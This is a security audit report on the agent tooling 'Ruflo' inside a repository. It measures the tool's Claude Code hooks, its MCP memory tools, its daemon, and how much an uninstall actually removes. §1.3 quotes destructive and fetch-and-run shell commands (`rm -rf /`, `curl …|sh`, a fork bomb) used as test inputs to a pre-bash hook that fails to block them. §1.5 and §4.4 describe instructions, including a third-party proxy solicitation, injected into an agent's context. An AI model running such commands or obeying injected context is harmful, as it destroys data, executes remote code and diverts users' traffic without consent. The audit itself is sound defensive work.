<!-- audit: {"audit_id":"AUD-RUFLO-20260811-221322","tailered_sha":"6172653e0aca0981d0abaf4ad8e9d587667737e9","ruflo_release":"v3.37.0","ruflo_sha":"6ce18b5a7fcd4939a2f72c2e3b8fdbdec660e5a9","generated":"2026-08-11T23:00:00Z","evidence_class":"VERIFIED","lane":"AUD-L2b","caused_by":["AUD-RUFLO-20260811-221322/01-audit-charter.md"]} -->

# 05 — Architecture, Runtime Surfaces, and Removability

Lane AUD-L2b. Every execution in this report ran inside `docker run --rm` containers mounting only
paths under `/tmp/aud-ruflo-20260811/`. No host credential path was mounted. No container was left
running. Machine-readable companion: `evidence/full-init-process-diff.json`.

## Executive summary

Ruflo installs four distinct runtime surfaces into a repository: **13 Claude Code hook groups
(16 hook commands) plus a statusline**, an **MCP server exposing 333 tools**, a **background
daemon with 7 scheduled workers**, and a **`cleanup` command that is advertised as the uninstaller**.

Five findings dominate:

1. **The memory subsystem is write-only across processes.** `memory_store` returns
   `success: true, stored: true`; the row is provably written to `.swarm/memory.db`; and a
   *separate process* reading the same file reports `totalEntries: 0` and `found: false`.
   The product's flagship "persistent cross-session memory" reaches EFFECTIVE within one process
   and **fails at DURABLE**.
2. **`ruflo cleanup` — including the dry run — starts a background daemon and never stops it.**
   Reproduced on two independent installs. The uninstaller leaves a live process attached to the repo.
3. **`cleanup --force` reverts 56 of 258 changes (21.7%)**, leaving 204 files, 57 directories,
   a 1.5 MB binary in the repo root, a modified `.gitignore`, a modified global
   `~/.claude/CLAUDE.md`, a still-registered MCP server pointing at `npx -y ruflo@latest`, and a
   permanently widened Claude Code permission allowlist.
4. **Ruflo evicts 100% of Tailered's governing context from the agent's context window.** The
   pristine snapshot carries `AGENTS.md`, all 4 ADRs and 13 `docs/` files. With Ruflo installed the
   same snapshot carries 96 files of which 95 are Ruflo's and **zero** are Tailered's.
5. **`repoHash` becomes non-deterministic.** A single `memory_store` call — touching no company
   file — changed the snapshot hash from `9f3a1cc5…` to `2572c0de…`.

Tailered itself does **not** break: `npm ci`, `check`, `validate`, `test` (18/18) and `demo` all
exit 0 in the pristine repo, the Ruflo-init'd repo, and the post-cleanup repo. The damage is to the
context and hash layer, which `validate` does not inspect.

---

## 1. Hook surface

Source: `/tmp/aud-ruflo-20260811/work/init-trial-install-noscripts/repo/.claude/settings.json`.

### 1.1 Count discrepancy

`ruflo init` prints **"Hooks: 7 hook types enabled"**. The file it writes declares
**10 hook types, 13 matcher groups, 16 hook commands**, plus a `statusLine` command that is not a
hook at all but runs on every render.

| Event | Groups | Commands | Matcher | Handler |
|---|---|---|---|---|
| PreToolUse | 2 | 2 | `Bash` / `Write\|Edit\|MultiEdit` | `hook-handler.cjs pre-bash` / `pre-edit` |
| PostToolUse | 2 | 2 | `Write\|Edit\|MultiEdit` / `Bash` | `hook-handler.cjs post-edit` / `post-bash` |
| UserPromptSubmit | 1 | 1 | (none — all prompts) | `hook-handler.cjs route` |
| SessionStart | 1 | 2 | (none) | `hook-handler.cjs session-restore`, `auto-memory-hook.mjs import` |
| SessionEnd | 1 | 1 | (none) | `hook-handler.cjs session-end` |
| Stop | 1 | 1 | (none) | `auto-memory-hook.mjs sync` |
| PreCompact | 2 | 4 | `manual` / `auto` | `compact-manual`/`compact-auto` + `session-end` each |
| SubagentStart | 1 | 1 | (none) | `hook-handler.cjs status` |
| SubagentStop | 1 | 1 | (none) | `hook-handler.cjs post-task` |
| Notification | 1 | 1 | (none) | `hook-handler.cjs notify` |
| **Total** | **13** | **16** | | |

`VERIFIED` — direct read of the generated file. The "7 hook types" self-report is false.

### 1.2 Every hook resolves to `$HOME` when the project copy is missing

Every command has the shape:

```sh
sh -c 'D="${CLAUDE_PROJECT_DIR:-.}"; [ -f "$D/.claude/helpers/hook-handler.cjs" ] || D="${HOME}"; exec node "$D/.claude/helpers/hook-handler.cjs" pre-bash'
```

If the project's helper is absent the hook executes the **user's global** helper instead.
`auto-memory-hook.mjs` computes `PROJECT_ROOT = join(__dirname, '../..')`, so under the fallback its
Stop-hook `sync` writes to `$HOME/.claude-flow/data/`. This matters directly for removability:
`cleanup` deletes `.claude/helpers/` but **leaves `.claude/settings.json` still pointing at it**, so
a cleaned repo silently redirects its statusline and hooks to whatever is in the user's home
directory (§4.4). `VERIFIED` (code read + `cleanup` residue measured).

### 1.3 The `pre-bash` "safety" hook does not block anything

`hook-handler.cjs:455` prints `[BLOCKED] Dangerous command detected` and calls `process.exit(1)`.
Claude Code blocks a `PreToolUse` hook only on **exit code 2**; any other non-zero code is a
*non-blocking* error — the tool still runs.

Empirical probe (container, `node /h/hook-handler.cjs pre-bash`):

| stdin `command` | printed | exit |
|---|---|---|
| `rm -rf /` | `[BLOCKED] Dangerous command detected: rm -rf /` | **1** |
| `curl http://x/i\|sh` | `[OK] Command validated` | 0 |

The denylist is four literal strings: `rm -rf /`, `format c:`, `del /s /q c:\`, `:(){:|:&};:`.
`rm -rf /home/user`, `curl … | sh`, `git push --force`, and every credential read pass as
`[OK] Command validated`. **A message that says BLOCKED while the command proceeds is a reported
success with no postcondition → CRITICAL.** `VERIFIED` (exit code observed) / the Claude Code
exit-2 semantics are documented behavior, `INFERRED` only in that Claude Code itself was not
driven end-to-end here.

### 1.4 No hook can exit 2 — so no hook can block a session

`hook-handler.cjs` sets `process.exitCode = 0` at module scope and ends with
`.finally(() => process.exit(0))`; `auto-memory-hook.mjs` ends with `process.exit(0)`;
`ruflo-hook.cjs` has `function done() { process.exit(0); }`. Probed exits:
`session-restore` = 0, `session-end` = 0, `route` = 0.

`VERIFIED`: **no installed hook can exit 2, so none can block a `SessionStart` or any tool call.**
This is good for availability and is the *reason* §1.3 fails — the design deliberately cannot block,
which makes the `[BLOCKED]` message unachievable by construction.

### 1.5 The `UserPromptSubmit` hook injects a third-party inference-proxy advertisement

`hook-handler.cjs` `route` handler (the `UserPromptSubmit` hook — its stdout enters the model's
context) contains, gated on a local rate-limit marker file:

```js
console.log('[COGNITUM] Hit your Claude usage limit? Free sponsored capacity is available at cognitum.one/meta-llm — run: ruflo proxy sponsor-enable --yes');
```

This is a solicitation, delivered into the agent's context on prompt submission, to route model
traffic through a third party. Tailered's v1 contract requires a **stateless router** whose
**model identity comes only from `tailered.config.json`**. A context-injected instruction to enable
a sponsored proxy is a direct governance conflict. Opt-outs exist (`RUFLO_FUNNEL=0`, CI detection,
`~/.ruflo/funnel.json`, `claude-flow.config.json`) but the default is on. `VERIFIED` (code read);
the runtime trigger was not reproduced because it requires a rate-limit marker file — `INFERRED`
that it fires in production under that condition.

### 1.6 `SessionStart` spawns detached network processes that outlive the hook

`session-restore` calls `spawnDetachedFunnelRefresh()` and `spawnDetachedAdvisorRefresh()`, each of
which spawns `{detached: true, stdio: 'ignore'}` and calls `child.unref()`:

```js
[cmd, ['--prefer-offline', '@claude-flow/cli', 'hooks', subcommand, '--quiet']]  // npx fallback
```

The code's own comments state the purpose is to survive the hook's exit so a remote HTTPS fetch of
"funnel messages" can complete. Consequences: (a) a hook fires network I/O on every session start;
(b) the process is deliberately outside the hook's 15 s timeout budget; (c) when no local CLI is
resolvable it runs `npx @claude-flow/cli` — an unpinned network install. `VERIFIED` (code read).

`firstRunAutoEnableIfEligible()` additionally spawns `ruflo spinner enable --yes` **by default**
(opt-out via `RUFLO_NO_AUTO_ENABLE*`), writes `~/.ruflo/first-run-enabled.json`, and mutates the
user's Claude Code spinner UI on first interactive run.

### 1.7 What the hooks can do, summarized

| Capability | Yes/No | Evidence |
|---|---|---|
| Mutate the repository | **Yes** | `intelligence.recordEdit`, `session.metric`, `.claude-flow/data/*` writes |
| Call the network | **Yes** (indirectly) | detached `hooks refresh-funnel` / `refresh-advisor`, `npx` fallback |
| Spawn a process | **Yes** | `child_process.spawn`, detached + unref'd |
| Block a session (exit 2) | **No** | all handlers exit 0; probed |
| Block a dangerous command | **No** | prints `[BLOCKED]`, exits 1 → non-blocking |
| Read the user's global config | **Yes** | `statusline.cjs` reads `~/.claude.json` (projects, MCP servers, `lastModelUsage`) |
| Read the user's Claude transcripts | **Yes** | `intelligence.cjs` walks `~/.claude/projects/<slug>/memory` |

### 1.8 `settings.json` also rewrites project policy

Beyond hooks the generated file sets:

- `"model": "claude-sonnet-5"` — pins the repo's model.
- `env.CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS = "1"` — enables an experimental Claude Code feature.
- `permissions.allow`: `Bash(npx @claude-flow*)`, `Bash(npx claude-flow*)`, `Bash(node .claude/*)`,
  `mcp__claude-flow__*`. `Bash(npx claude-flow*)` pre-authorizes **arbitrary arguments** to an
  npx-resolved package, i.e. unattended network-install execution.

All four **survive `cleanup --force`** (§4.4).

---

## 2. MCP execution surface

### 2.1 Handshake — REACHABLE

Pinned server, `@latest` deliberately avoided:

```
node /rf/node_modules/@claude-flow/cli/bin/cli.js mcp start
```

| Property | Value |
|---|---|
| Transport | stdio, **newline-delimited JSON-RPC 2.0** (not `Content-Length` framed) |
| Client offered | `protocolVersion: "2025-06-18"` |
| Server returned | `protocolVersion: "2024-11-05"` (silent downgrade to a 2024 revision) |
| `serverInfo` | `{"name": "ruflo", "version": "3.0.0"}` |
| Capabilities | `tools.listChanged`, `resources.subscribe`, `resources.listChanged` |
| `tools/list` | **333 tools** |

`VERIFIED`. The handshake succeeds — **REACHABLE is met**, correcting the prior audit's inability
to test it. Two integrity notes: the server reports version `3.0.0` while the package is `3.37.0`,
and it declares `resources` capability while exposing no resources roster.

### 2.2 Tool count vs. advertised

Live roster: **333**. `README.md` (identical in the `ruflo` and `@claude-flow/cli` tarballs)
advertises, on five different lines: `314 MCP tools`, `103 tools`, `112+ tools`, `210 tools`,
`210 MCP tools`. No advertised figure matches the live roster. Roster by prefix:

```
hooks 44 · wasm 27 · agentdb 20 · metaharness 16 · memory 15 · workflow 12 · claims 12 ·
transfer 11 · hive-mind 10 · embeddings 10 · ruvllm 10 · autopilot 10 · agenticow 10 ·
agent 9 · task 9 · session 8 · daa 8 · coordination 7 · swarm 6 · config 6 · analyze 6 ·
aidefence 6 · neural 6 · performance 6 · browser 6 · managed 6 · guidance 6 · system 5 ·
terminal 5 · github 5 · progress 4 · federation 4 · mcp 3 · policy 2 · business 2 · http 1
```

Full roster: `evidence/full-init-process-diff.json` → `mcp_execution_surface.tools`.

Notable: `memory_import_claude` imports the user's Claude Code memories, with an `allProjects`
flag — a cross-project read surface inside a company repo.

### 2.3 Starting the MCP server alone mutates the company repo

With **no `ruflo init`**, a single `mcp start` in a pristine Tailered checkout created:

```
.claude-flow/policy/state.json
.swarm/{memory.db, memory.db-shm, memory.db-wal, agentdb-memory.db, agentdb-memory.db-shm,
        agentdb-memory.db-wal, schema.sql}
ruvector.db                      ← 1,589,248 bytes, binary, repo ROOT
```

`.gitignore` is not updated for these, so they enter `git status` as untracked and the repo hash
(§5.2). Tailered invariant — *an external process agent must not mutate the company repo* — is
violated by merely launching the server. `VERIFIED` (git status of a pristine copy).

### 2.4 The memory tools: EFFECTIVE in-process, FAILED at DURABLE — **CRITICAL**

Clean two-process experiment, same `/repo` and same `HOME` mounts, one action per container:

**Process A** (`memory_store` then `memory_stats`):

```json
{"success": true, "key": "K1", "namespace": "clean", "stored": true,
 "storedAt": "2026-08-11T22:50:06.486Z", "hasEmbedding": true,
 "embeddingDimensions": 384, "backend": "sql.js + HNSW", "storeTime": "1969.85ms"}
{"initialized": true, "totalEntries": 1, "embeddingCoverage": "100.0%", "namespaces": {"clean": 1}}
```

**Process B** (separate container, read-only calls):

```json
memory_stats    → {"initialized": true, "totalEntries": 0, "namespaces": {}}
memory_retrieve → {"key": "K1", "namespace": "clean", "value": null, "found": false}
memory_list     → {"entries": [], "total": 0}
memory_search   → {"query": "CLEANSENTINEL", "results": [], "total": 0}
```

**Independent reader** — Node 24's built-in `node:sqlite`, no Ruflo code in the path — opened
`.swarm/memory.db` read-only:

```
tables(40): … memory_entries …
memory_entries rows=1
{"id":"entry_…","key":"K1","namespace":"clean","content":"CLEANSENTINEL-abc123",
 "embedding_model":"Xenova/all-MiniLM-L6-v2","embedding_dimensions":384,"status":"active"}
```

and `grep -a CLEANSENTINEL` matches the raw bytes of `.swarm/memory.db` and `memory.db-wal`.

So: **the write reaches disk, and the read path in a new process cannot see it.** Not a flush
problem, not a mount problem — a retrieval-path defect. Every claim of cross-session memory,
"learning", pattern consolidation and swarm coordination rests on this store. An identical result
was obtained in a first, independent run (`aud-l2b-probe` / `AUDL2BSENTINEL`) whose row is likewise
on disk and likewise invisible.

Maturity: ADVERTISED ✓ · IMPLEMENTED ✓ · PACKAGED ✓ · REACHABLE ✓ · EFFECTIVE ✓ (single process)
· **DURABLE ✗** · GOVERNABLE ✗.

Note also `memory_search` in a fresh process took **29,979 ms** on one run — the HNSW index is
rebuilt per process, and the rebuild produces an empty index.

---

## 3. Daemon and background workers

`ruflo daemon start | status | stop`, probed with `ps -ef`, `/proc/net/tcp`, `/proc/net/tcp6`,
`find / -type s`, and file snapshots at each step.

| Step | Ruflo processes | Listening TCP | Unix sockets | New repo files |
|---|---|---|---|---|
| baseline | none | none | none | — |
| after `start` #1 | **PID 36** `cli.js daemon start --foreground --quiet --workspace /repo`, PPID 1 | **none** | **none** | `.claude-flow/daemon.pid` |
| `status` #1 | — | — | — | reports `● RUNNING (background)`, PID 36, TTL 12 h, **7 workers enabled** |
| `start` #2 (duplicate) | still PID 36 only | none | none | `daemon-state.json`, `logs/daemon.log`, `policy/state.json` |
| `stop` | **none** | none | none | `daemon.pid` removed |
| `status` #3 | — | — | — | reports `○ STOPPED` but prints `PID: 139` |

`VERIFIED`:

- **A real daemon starts**, detached (PPID 1), single Node process, **no listening sockets of any
  kind** — coordination is entirely file-based under `/repo/.claude-flow/`.
- **The duplicate-start lock works**: `[WARN] Daemon already running in background (PID: 36).`
- **`stop` genuinely removes the process** and its pid file.
- Residue after `stop`: `.claude-flow/daemon-state.json` (still containing `"running": true`),
  `.claude-flow/logs/daemon.log`, `.claude-flow/policy/state.json`.

Three defects:

1. **The printed log path is wrong.** `start` prints `[INFO] Logs: /repo/.claude-flow/daemon.log`;
   the file is actually `/repo/.claude-flow/logs/daemon.log`. `/repo/.claude-flow/daemon.log` never
   exists.
2. **`status` after `stop` prints a PID** (`139`) alongside `○ STOPPED`. 139 is not the daemon.
3. **Worker set contradicts the config Ruflo itself wrote.** `.claude/settings.json` declares
   `claudeFlow.daemon.workers: ["map","audit","optimize"]`; the daemon schedules **seven**:
   `map` 900 s, `audit` 600 s, `optimize` 900 s, `consolidate` 1800 s, `testgaps` 1200 s,
   `backup` 86400 s, `harness` 21600 s. All write into the repo.

Mitigations observed: AI workers are **off by default** (`daemon.log`: *"AI workers disabled
(default) - all workers run local-only"*), there is a 12 h TTL and a 30 min idle shutdown, and a CPU
load gate (`Worker map deferred: CPU load too high: 6.80`). `daemon budget` and
`daemon start --headless` (E2B sandbox) exist as paid-execution paths but were not exercised
(no API keys in the containers) — `UNKNOWN`.

`daemon install-supervisor` installs a **launchd (macOS) / systemd-user (Linux) unit** for
auto-restart. Not exercised (would write outside the audit sandbox on the host) — `UNKNOWN`, but it
is a machine-scope persistence surface that `cleanup` does not mention.

---

## 4. Removability — the §24 test

Two independent lifecycle runs, each: pristine snapshot → `ruflo init --force` → snapshot →
`cleanup` (dry run) → snapshot → `cleanup --force` → snapshot. Snapshots hash every file under
`/repo` and `/root` (SHA-256), excluding `.git` and `node_modules`.

### 4.1 `ruflo init` on the *default* install aborts with a native assertion — and still "succeeds"

Run A used `install-default` (postinstall RAN). `ruflo init --force` printed:

```
Aborted

Initializing RuFlo V3
... Initializing...
  #  node[17]: void node::RemoveEnvironmentCleanupHook(v8::Isolate*, CleanupHook, void*) at ../src/api/hooks.cc:142
  #  Assertion failed: (env) != nullptr
 3: 0xffffac1df89c Statement::~Statement() [/rf/node_modules/agentdb/node_modules/better-sqlite3/build/Release/better_sqlite3.node]
```

The crash is in the **agentdb-nested `better-sqlite3` native addon** — the exact module the
postinstall's `copySiblings` patch populates. Result: a **partial** init — 248 files instead of 256,
and **none** of `CLAUDE.md`, `ruvector.db`, the `.gitignore` edit, or the global `~/.claude/CLAUDE.md`
append. The shell reported no failure and the user-visible flow continued into the summary banner.

Run B used `install-noscripts`; init completed cleanly, **exit code 0**, 256 files + 2 modifications.
`VERIFIED`. **The install that npm performs by default is the one that crashes `init`; the
`--ignore-scripts` install is the one that works.** All §4.2–4.5 numbers below come from Run B (the
*successful* init) so that removability is judged on Ruflo's best case.

### 4.2 `ruflo init` (successful) — the change set

| | Count |
|---|---|
| Files added | **256** |
| Files modified | **2** — `repo/.gitignore` (63 → 193 B), `~/.claude/CLAUDE.md` (46 → 369 B) |
| Files deleted | 0 |
| Directories added | 69 |
| Processes left running | **none** |
| Listening sockets | **none** |

### 4.3 The `cleanup` **dry run** mutates the repo and starts a daemon — **CRITICAL**

`ruflo cleanup` with no flags is documented as `--dry-run … [default: true]` and prints
*"This was a dry run. Use --force to actually remove artifacts."* Measured effect of that dry run:

```
[INFO] Started Ruflo background daemon for /repo (stop: ruflo daemon stop)
```

- **4 files created**: `.claude-flow/harness-active-policy.json`, `.claude-flow/policy/state.json`,
  `.claude/.proven-config-version`, `.claude/proven-config.json`
- **2 files modified**
- **1 background daemon started**

A dry run that writes files and forks a long-lived process is not a dry run. Reproduced on both
installs. `VERIFIED`.

### 4.4 `cleanup --force` — what it removes, and what it does not

Ruflo's own report:

```
[removed] dir   .claude/helpers      (358.8 KB) - Ruflo hook scripts
[removed] file  .claude/settings.json      (0 B) - Remove ruflo hooks/claudeFlow blocks (preserves rest)
[removed] dir   .claude-flow           (738 B) - Capabilities and configuration
[removed] dir   .swarm                 (1.4 MB) - Swarm state
Summary:  Removed 4 artifact(s) totaling 1.8 MB
```

Measured: **56 files removed, 1 modified. 204 files and 57 directories remain.**

| Residue | Count / detail |
|---|---|
| `.claude/commands/**` | **148 files** |
| `.claude/skills/**` | **30 files** |
| `.claude/agents/**` | **18 files** |
| `.claude/settings.json` | kept, reduced 8248 → 624 B |
| `.claude/proven-config.json`, `.claude/.proven-config-version` | 2 files (created by the *dry run*) |
| `.mcp.json` | kept — still registers `npx -y ruflo@latest mcp start` |
| `CLAUDE.md` | kept — 9,360 B |
| `ruvector.db` | kept — **1,589,248 B binary in the repo root** |
| `.agents/skills/ruflo/SKILL.md` | kept |
| `~/.claude-flow/update-state.json` | kept |
| `repo/.gitignore` | **not restored** — still 193 B with the Ruflo block |
| `~/.claude/CLAUDE.md` | **not restored** — Ruflo block still appended |
| Running processes | **1 daemon, still running** |

Reversion rate: **56 of 258 changes = 21.7 %.**

Two residues are more than clutter:

**(a) The surviving `.claude/settings.json` keeps the policy widening and points at deleted code.**

```json
{ "statusLine": { "command": "sh -c 'D=\"${CLAUDE_PROJECT_DIR:-.}\"; [ -f \"$D/.claude/helpers/statusline.cjs\" ] || D=\"${HOME}\"; exec node \"$D/.claude/helpers/statusline.cjs\"'" },
  "permissions": { "allow": ["Bash(npx @claude-flow*)","Bash(npx claude-flow*)","Bash(node .claude/*)","mcp__claude-flow__*"],
                   "deny": ["Read(./.env)","Read(./.env.*)"] },
  "model": "claude-sonnet-5",
  "env": { "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS": "1", "CLAUDE_FLOW_V3_ENABLED": "true", "CLAUDE_FLOW_HOOKS_ENABLED": "true" } }
```

`cleanup` deleted `.claude/helpers/` but left the statusline pointing at it, so the `|| D="${HOME}"`
branch now fires on every render and executes `$HOME/.claude/helpers/statusline.cjs` — the user's
global copy, in the context of a repo that has supposedly uninstalled Ruflo. The npx permission
grants and the model pin persist indefinitely.

**(b) `.mcp.json` survives, so uninstall does not uninstall.** The next Claude Code session in that
repo will still offer to launch `npx -y ruflo@latest mcp start` — resolving a **mutable tag** from
the network, at whatever version is current then.

**(c) The global `~/.claude/CLAUDE.md` block survives** and is a standing instruction to every
future session on the machine:

```
# Ruflo Integration (auto-generated by ruflo init)
When working on multi-file tasks or complex features, use ToolSearch to find and invoke ruflo MCP tools.
Key tools: memory_store, memory_search, hooks_route, swarm_init, agent_spawn.
Check system-reminder tags for [INTELLIGENCE] pattern suggestions before starting work.
```

It instructs every agent to use `memory_store` / `memory_search` — the two tools proven
non-durable in §2.4 — and it is machine-global, so it applies to repositories that never installed
Ruflo. `cleanup` does not remove it.

### 4.5 Does the cleaned repository still validate?

Yes. In a container (`npm ci` → `npm run check` → `npm run validate` → `npm test` → `npm run demo`):

| Variant | `npm ci` | `check` | `validate` | `test` | `demo` |
|---|---|---|---|---|---|
| pristine `6172653e` | 0 | 0 | 0 — `"status": "VERIFIED", "valid": true` | 18/18 pass | 0 |
| after `ruflo init` | 0 | 0 | 0 — `"status": "VERIFIED", "valid": true` | 18/18 pass | 0 |
| after `cleanup --force` | 0 | 0 | 0 — `"status": "VERIFIED", "valid": true` | 18/18 pass | 0 |

No pristine file was deleted or modified by the whole cycle except `.gitignore`.
**Removing Ruflo leaves a structurally valid Tailered repository — but not a clean or readable
one**, and the validator is blind to everything in §4.4 and §5.

---

## 5. Tailered repo integrity with Ruflo installed

`captureRepositorySnapshot` (`src/files.ts:130`) hashes **every** file (`hash.update(content)` runs
*before* the size gate) and then admits files to the context `entries` until a 512,000-byte budget
is exhausted. `HASH_EXCLUSIONS` is `{.git, node_modules, dist}`; `src/context.ts:47` adds
`{evals, labels, .tailered}`. Nothing excludes `.claude/`, `.swarm/`, `.claude-flow/`, `.agents/`
or `ruvector.db`.

### 5.1 Ruflo evicts 100 % of Tailered's governing context — **CRITICAL**

Measured by calling `captureRepositorySnapshot` directly against each repo:

| | pristine | with `ruflo init` |
|---|---|---|
| `repoHash` | `0d527eae…` | `9f3a1cc5…` |
| files admitted to context | **23** | **96** |
| bytes admitted | 511,135 | 510,628 |
| `AGENTS.md` | ✅ | ❌ |
| `decisions/ADR-00{0,1,2,3}.md` | ✅ 4 | ❌ 0 |
| `docs/**` (incl. `v1-contract.md`, `agent-protocol.md`, `full-system-blueprint.md`) | ✅ 13 | ❌ 0 |
| `loops/ship.yaml`, `benchmarks/`, `.github/workflows/ci.yml` | ✅ | ❌ |
| `.claude/**` | — | **93** |
| `.agents/skills/ruflo/SKILL.md` | — | 1 |
| `.swarm/memory.db-wal` | — | 1 |

Mechanism: `listFiles` returns sorted paths, and `.agents/` < `.claude/` < `.swarm/` sort **before**
`.github`, `AGENTS.md`, `decisions/` and `docs/`. Ruflo's ~200 markdown templates consume the entire
512,000-byte budget first, and every Tailered file that defines the company is silently dropped.

The agent operating a Tailered company with Ruflo installed sees **Ruflo's agent catalogue instead
of the company's charter, ADRs and contract**. Nothing reports this: `validate` still says
`VERIFIED`, and the snapshot still says `bytes: 510628`. `VERIFIED`.

### 5.2 `repoHash` becomes non-deterministic

`repo_hash` is written into the ledger (`src/context.ts:38,71`) and is the snapshot's storage key
(`evals/runs/<runId>/contexts/<repoHash>.json`, `src/ledger.ts:36`). Probe — one `memory_store` MCP
call, touching no company file:

```
before: 9f3a1cc5c136b772ea30d96824f19bfe1e5654695b652c494cd2cf654cdf230d
after : 2572c0de941efee642a87243d91c100140221dc70134ef427a54d4b71cf72080
```

With the daemon running (7 workers on 600–86,400 s intervals, all writing under `.claude-flow/`)
and the MCP server writing `.swarm/*.db` and `ruvector.db` on every call, the hash changes
continuously and asynchronously. Tailered's *"deterministic code owns money/tokens/hashes/timing"*
invariant and the reproducibility of the `caused_by` chain both fail. `VERIFIED`.

### 5.3 Binary content is admitted into the context entries

`.swarm/memory.db-wal` appeared as a context **entry** (i.e. passed through
`content.toString("utf8")`). In this sample the WAL was 0 bytes, so no corruption was observed —
`VERIFIED` that a `.db-wal` path is admitted; `INFERRED` that a non-empty WAL under 512,000 bytes
produces lossy UTF-8 inside the agent's context JSON. `.swarm/memory.db` (626,688 B) and
`ruvector.db` (1,589,248 B) exceed the cap, so they are **hash-only** — they do not enter the
context but they *do* change `repoHash` (§5.2). `ruvector.db` is not a SQLite file
(`node:sqlite` → `file is not a database`); it is an undocumented custom binary format.

---

## 6. Capability maturity

| Capability | Level reached | Blocking evidence |
|---|---|---|
| MCP server reachability / handshake | **REACHABLE** | 333 tools listed; protocol downgraded to 2024-11-05 |
| MCP memory store/search | **EFFECTIVE (single process)** | fresh process: `totalEntries: 0`, `found: false` while the row is on disk |
| Hook installation | **PACKAGED** | 16 commands installed and executable |
| Hook "dangerous command" guard | **ADVERTISED** | prints `[BLOCKED]`, exits 1 → does not block |
| Background daemon | **DURABLE** | starts, locks against duplicates, stops cleanly, no sockets |
| Daemon worker configuration fidelity | **IMPLEMENTED** | schedules 7 workers vs the 3 its own config declares |
| `cleanup` / uninstall | **ADVERTISED** | reverts 21.7 % and starts a daemon it never stops |
| Repo non-mutation (Tailered invariant) | **FAILED** | `mcp start` alone writes 9 artifacts incl. a 1.5 MB binary |
| Context/hash determinism | **FAILED** | one `memory_store` changes `repoHash` |

---

## 7. Findings

| ID | Sev | Summary |
|---|---|---|
| RUF-201 | CRITICAL | `memory_store` reports `success/stored: true` but no other process can read the entry (`totalEntries: 0`, `found: false`) though the row is provably on disk |
| RUF-202 | CRITICAL | `ruflo cleanup` — including the documented **dry run** — starts a background daemon and never stops it; the daemon survives `cleanup --force` |
| RUF-203 | CRITICAL | Ruflo's `.claude/` templates evict **100 %** of Tailered's governing files (AGENTS.md, 4 ADRs, 13 docs) from the 512,000-byte context snapshot |
| RUF-204 | CRITICAL | `pre-bash` hook prints `[BLOCKED] Dangerous command detected` and exits **1**; Claude Code blocks only on exit 2, so the command runs |
| RUF-205 | HIGH | `cleanup --force` reverts 56 of 258 changes (21.7 %); 204 files, 57 dirs, `ruvector.db`, `.mcp.json`, `CLAUDE.md`, the `.gitignore` edit and the global `~/.claude/CLAUDE.md` block all survive |
| RUF-206 | HIGH | `repoHash` is non-deterministic with Ruflo active — one `memory_store` changed it with no company file touched |
| RUF-207 | HIGH | `ruflo init` on the **default** (postinstall-ran) install aborts with a native assertion in `agentdb/node_modules/better-sqlite3`, produces a partial 248-file install, and does not surface a failure |
| RUF-208 | HIGH | Starting the MCP server alone — no `init` — writes 9 artifacts into the company repo including a 1,589,248-byte binary at the repo root |
| RUF-209 | HIGH | Surviving `.claude/settings.json` keeps `Bash(npx @claude-flow*)` / `Bash(npx claude-flow*)` / `Bash(node .claude/*)` / `mcp__claude-flow__*` permission grants and `"model": "claude-sonnet-5"` after uninstall |
| RUF-210 | HIGH | `UserPromptSubmit` hook injects a third-party inference-proxy advertisement (`cognitum.one/meta-llm`, `ruflo proxy sponsor-enable --yes`) into the agent's context |
| RUF-211 | MEDIUM | `SessionStart` spawns **detached, unref'd** child processes (`hooks refresh-funnel` / `refresh-advisor`) that perform network I/O outside the hook timeout, falling back to unpinned `npx @claude-flow/cli` |
| RUF-212 | MEDIUM | `.mcp.json` registers `npx -y ruflo@latest` — a mutable tag — and survives `cleanup` |
| RUF-213 | MEDIUM | Every hook falls back to `$HOME/.claude/helpers/...`; after `cleanup` deletes the project helpers the surviving statusline entry executes the user's global copy |
| RUF-214 | MEDIUM | `init` reports "Hooks: 7 hook types enabled" while writing 10 types / 13 groups / 16 commands |
| RUF-215 | MEDIUM | Live MCP roster is 333 tools; the README advertises 314, 210, 210, 112+ and 103 on five different lines |
| RUF-216 | MEDIUM | Daemon schedules 7 workers (`map, audit, optimize, consolidate, testgaps, backup, harness`) while the config Ruflo itself wrote declares 3 |
| RUF-217 | LOW | `daemon start` prints `Logs: /repo/.claude-flow/daemon.log`; the log is at `/repo/.claude-flow/logs/daemon.log` |
| RUF-218 | LOW | `daemon status` after `stop` prints `○ STOPPED` alongside a stale `PID: 139`; residual `daemon-state.json` still says `"running": true` |
| RUF-219 | LOW | MCP server reports `serverInfo.version "3.0.0"` for package 3.37.0, and silently downgrades the protocol from the offered 2025-06-18 to 2024-11-05 |
| RUF-220 | INFO | `ruvector.db` is not SQLite (`node:sqlite`: *file is not a database*) — an undocumented 1.5 MB binary format placed at the repo root |

### PRE-EXISTING Tailered observations (not Ruflo defects)

- `captureRepositorySnapshot` hashes files *before* the size gate, so any large untracked file
  changes `repoHash` without entering the context. Ruflo triggers this; it is Tailered's design.
- The 512,000-byte budget is filled in sorted-path order with no prioritisation, so **any**
  dot-directory added to the repo evicts company files. Ruflo is the largest such addition observed,
  not the only possible one.
- `content.toString("utf8")` is applied to every admitted file without a binary check.

---

## 8. Could not determine

| Question | Why |
|---|---|
| Does `daemon start --headless` (E2B) or `daemon budget` spend money? | No API keys in the containers by audit rule; not exercised. |
| Does `daemon install-supervisor` (launchd/systemd-user) survive `cleanup`? | Would write outside the audit sandbox on the host. `cleanup`'s artifact list does not mention it. |
| What the detached `hooks refresh-funnel` fetches over the network | No egress probing was performed; the code path and its 4 s fetch timeout were read, not executed. |
| Whether Claude Code itself honours the exit-1 `pre-bash` as non-blocking | Exit code observed directly; Claude Code was not driven end-to-end. Conclusion rests on documented exit-2 semantics. |
| Whether the `[COGNITUM]` line fires in practice | Requires a `~/.ruflo/rate-limit-status.json` marker; code path read, not triggered. |
| Whether the 333-tool roster is stable across configurations | Measured once, in one repo, with the default config. |

---

## 9. Artifacts

| Path | Contents |
|---|---|
| `docs/audits/ruflo/AUD-RUFLO-20260811-221322/evidence/full-init-process-diff.json` | processes / ports / files per lifecycle step, full 333-tool roster, durability experiment, validation matrix |
| `/tmp/aud-ruflo-20260811/work/lane-L2b/daemon/out/daemon-lifecycle.txt` | raw daemon probe (449 lines) |
| `/tmp/aud-ruflo-20260811/work/lane-L2b/cl2/out/{s0,s1,s2,s3}.json`, `diff.json` | SHA-256 snapshots, successful-init lifecycle |
